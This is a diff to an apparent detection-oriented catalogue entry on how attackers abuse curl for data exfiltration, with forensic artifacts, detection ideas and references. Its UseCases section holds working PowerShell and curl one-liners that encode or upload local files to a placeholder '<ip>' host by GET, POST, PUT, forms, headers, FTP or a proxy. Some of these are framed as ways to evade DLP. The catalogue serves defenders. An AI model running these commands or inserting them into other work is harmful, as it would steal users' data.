@@ -4,10 +4,10 @@ Aliases:
   - libcurl
   - curl.exe
 Description: >
-  curl is a native command-line utility for transferring data using multiple protocols like HTTP, HTTPS, and FTP.
-  It is included by default in modern Windows, macOS, and Unix/Linux systems. curl is often abused by threat actors
-  to exfiltrate data via HTTP(S) POST requests, file uploads using PUT, FTP transfers, custom headers, or multipart forms.
-  Its presence by default on most systems, combined with flexible options, makes it ideal for stealthy exfiltration.
+  curl is a native command-line utility preinstalled on most systems, used for transferring data via HTTP, HTTPS, FTP, and more.
+  It is frequently abused by threat actors for exfiltration because it supports flexible flags for uploading files,
+  injecting data into headers, sending encoded payloads, and routing through proxies. Its native presence on most operating systems
+  makes it ideal for stealthy data exfiltration with minimal dependencies or visibility.
 
 Category: native
 Platform:
@@ -16,117 +16,149 @@ Platform:
   - macOS
 Execution:
   - cli
+
 Capabilities:
-  - HTTP-request
-  - HTTPS-request
-  - FTP-upload
-  - file-upload
-  - header-manipulation
-  - proxy-aware
-Stealth:
-  - native-binary
-  - user-agent-manipulation
-  - silent-execution
-  - background-execution
-  - header-manipulation
-  - proxy-support
-  - encrypted-transfer
+  - HTTP-request             # Send GET/POST/PUT requests for exfiltration over HTTP(S).
+  - HTTPS-request            # Encrypts exfiltrated data in transit via TLS.
+  - FTP-upload               # Upload files via FTP to attacker-controlled servers.
+  - file-upload              # Transfer files using PUT, POST, or --upload-file.
+  - header-manipulation      # Insert sensitive data into HTTP headers.
+  - proxy-aware              # Route traffic via proxy to conceal true destination.
+  - silent-execution         # Suppress terminal output to hide activity.
+  - user-agent-manipulation  # Spoof User-Agent to mimic browsers or system utilities.
+  - encrypted-transfer       # Uses TLS/SSL by default for HTTP/S.
+  - background-execution     # Commonly run in scripts or background jobs for automation.
+
 Forensics:
   BinaryLocations:
     - /usr/bin/curl
+    - /usr/local/bin/curl
     - C:\Windows\System32\curl.exe
+  FileNamePatterns:
+    - curl
+    - curl.exe
   CommandLineArgs:
-    - --data
-    - --data-binary
-    - --upload-file
-    - --request
-    - --header
-    - --form
-    - --proxy
-  NetworkArtifacts:
-    - HTTP/HTTPS traffic with custom headers
-    - DNS queries to external servers
-    - PUT/POST uploads with file data
-    - FTP control and data connections
+    Description: >
+      These arguments have been observed in exfiltration activity involving curl, enabling file uploads,
+      encoded payloads, or stealth via proxy and header manipulation.
+    Indicators:
+      - --data
+      - --data-binary
+      - --upload-file
+      - --request
+      - --header
+      - --form
+      - --proxy
+      - --user-agent
   ConfigFiles:
     - ~/.curlrc
     - C:\Users\<user>\.curlrc
+  RegistryPersistence: []
+  LogFiles:
+    - /var/log/syslog
+    - ~/.bash_history
+    - C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+  NetworkArtifacts:
+    Description: >
+      curl generates outbound HTTP, HTTPS, or FTP connections. Detection can focus on:
+      - Suspicious POST/PUT uploads to external IPs or rare domains.
+      - Custom headers or user-agent strings in requests.
+      - Use of FTP from non-admin workstations.
+    Indicators:
+      - '*.http'
+      - '*.https'
+      - 'POST /'
+      - 'PUT /'
+      - 'ftp://*'
+      - 'Proxy-Authorization'
   ScheduledTask: []
+
 ThreatActors:
-  - LockBit
-  - BlackBasta
-  - FIN7
-  - APT-C-36
-References:
-  - https://unit42.paloaltonetworks.com/vice-society-ransomware-powershell/
-  - https://attack.mitre.org/software/S0660/
-  - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1041/T1041.md
+  - generic
+
 Tags:
-  - cli
-  - native
-  - http
-  - https
-  - ftp
-  - file-upload
-  - encrypted-transfer
-  - proxy-aware
-  - user-agent-manipulation
-  - lolbas
+  - ransomware
+  - apt
+
 UseCases:
   - Title: URL-encoded GET request
-    Description: Read file content, URL-encode it, and send via GET parameter.
+    Description: Encode file content into a URL parameter and send via GET request.
     Command: |
       $data = Get-Content "$env:USERPROFILE\Documents\data.csv" | Out-String
       $encoded = [uri]::EscapeDataString($data)
-      Invoke-Expression "curl http://<ip>:8080/exfil?curl_urlencoded=$encoded"
+      Invoke-Expression "curl http://<ip>:8080/exfil?data=$encoded"
 
   - Title: Base64-encoded GET request
-    Description: Base64 encode file content and send via GET parameter.
+    Description: Encode file content in Base64 and exfiltrate via GET parameter.
     Command: |
-      $data = Get-Content "$env:USERPROFILE\Documents\data.csv" | Out-String
-      $b64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data))
-      Invoke-Expression "curl http://<ip>:8080/exfil?curl_base64=$b64"
+      $b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Get-Content data.csv -Raw)))
+      curl "http://<ip>:8080?payload=$b64"
 
   - Title: HTTP POST with --data-binary
-    Description: Exfil file content in POST body.
-    Command: curl -X POST http://<ip>:8080/upload --data-binary "@C:\Users\Admin\Documents\data.csv"
-
-  - Title: HTTP PUT with --data-binary
-    Description: Exfil file via PUT upload.
-    Command: curl -X PUT http://<ip>:8080/upload --data-binary "@C:\Users\Admin\Documents\data.csv"
-
-  - Title: File upload using -T (PUT)
-    Description: Upload a large file using PUT.
+    Description: Upload a file using POST with raw binary data.
     Command: |
-      curl.exe -T "C:\Users\Admin\Documents\file.zip" http://<ip>:8080/out.zip
+      curl -X POST http://<ip>:8080/upload --data-binary "@C:\data.csv"
 
-  - Title: Upload multiple files in a loop
-    Description: Loop through CSV files in a directory and upload each file individually.
+  - Title: HTTP PUT with --upload-file
+    Description: Upload a local file to an HTTP server via PUT.
     Command: |
-      $files = Get-ChildItem "C:\Users\Admin\Documents" -Filter *.csv
-      foreach ($file in $files) {
-        curl.exe -T $file.FullName http://<ip>:8080/$($file.Name)
-        Start-Sleep -Seconds 1
+      curl -X PUT http://<ip>:8080/out.zip --upload-file "C:\file.zip"
+
+  - Title: Directory exfiltration loop
+    Description: Automate uploads of multiple files in a folder using PowerShell.
+    Command: |
+      Get-ChildItem "C:\Reports\*.csv" | ForEach-Object {
+        curl -T $_.FullName http://<ip>:8080/$($_.Name)
       }
 
   - Title: Multipart form upload
-    Description: Simulate browser upload using multipart form data.
+    Description: Simulate legitimate browser-based uploads using multipart/form-data.
     Command: |
-      curl.exe -X POST -F "file=@C:\Users\Admin\Documents\secret.zip" http://<ip>:8080/upload
+      curl -F "file=@C:\secret.zip" http://<ip>:8080/upload
 
   - Title: Custom header exfiltration
-    Description: Inject data as a custom HTTP header.
+    Description: Hide data in HTTP headers to bypass DLP or content inspection.
     Command: |
-      curl.exe -H "X-Data: $(Get-Content -Raw C:\Users\Admin\Documents\data.csv)" http://<ip>:8080/header
+      curl -H "X-Data: $(Get-Content C:\data.csv -Raw)" http://<ip>:8080/
 
-  - Title: FTP upload using --upload-file
-    Description: Upload a file using FTP with embedded credentials.
+  - Title: FTP file upload
+    Description: Upload data using FTP with embedded credentials.
     Command: |
-      curl.exe --upload-file "C:\Users\Admin\Documents\data.csv" ftp://ftpuser:pass@<ip>/data.csv
+      curl --upload-file "C:\data.csv" ftp://ftpuser:pass@<ip>/data.csv
 
-  - Title: Upload via proxy
-    Description: Use proxy to exfiltrate file and evade detection.
+  - Title: Proxy-assisted upload
+    Description: Route uploads through a proxy server to obscure destination.
     Command: |
-      curl.exe -x http://127.0.0.1:8080 -T "C:\Users\Admin\Documents\data.csv" http://<ip>:8080/data.csv
+      curl -x http://127.0.0.1:8080 -T "C:\secret.csv" http://<ip>:8080/secret.csv
 
-LastModified: "2025-09-24"
+Detection:
+  - Type: CLI Pattern Matching
+    Description: Detect use of curl with upload-related flags such as `--upload-file`, `--data-binary`, or `--form`. These often indicate outbound file transfer attempts.
+
+  - Type: Network Exfiltration via HTTP/S
+    Description: Monitor for outbound HTTP POST or PUT requests from endpoints using curl to external destinations. This includes detection of uploads to unknown or rare domains.
+
+  - Type: Custom Header Abuse
+    Description: Alert on the presence of sensitive content in non-standard headers (e.g., `X-Data`) used by curl, especially when paired with small payloads or encoded content.
+
+  - Type: Proxy-based Exfiltration
+    Description: Detect curl traffic routed via the `--proxy` flag, particularly when used to reach external or rarely used proxy endpoints. Look for uploads that occur during off-hours or bypass traditional network paths.
+
+  - Type: FTP Usage from User Endpoints
+    Description: Identify FTP upload attempts initiated from curl, especially when embedded credentials are present or when FTP is otherwise uncommon in the environment.
+
+  - Type: Sigma Detection Rule
+    Description: Elastic detection rule for identifying curl-based exfiltration via command-line arguments or behavior patterns.
+    Reference: https://www.elastic.co/guide/en/security/8.19/potential-data-exfiltration-through-curl.html
+
+Testing:
+  - https://www.elastic.co/guide/en/security/8.19/potential-data-exfiltration-through-curl.html
+
+References:
+  - https://unit42.paloaltonetworks.com/vice-society-ransomware-powershell/
+  - https://attack.mitre.org/software/S0660/
+  - https://attack.mitre.org/techniques/T1041/
+  - https://www.trendmicro.com/en_us/research/23/a/attackers-abuse-native-utilities-for-data-exfiltration.html
+  - https://www.mandiant.com/resources/blog/command-line-data-exfiltration
+
+LastModified: "2025-11-07"
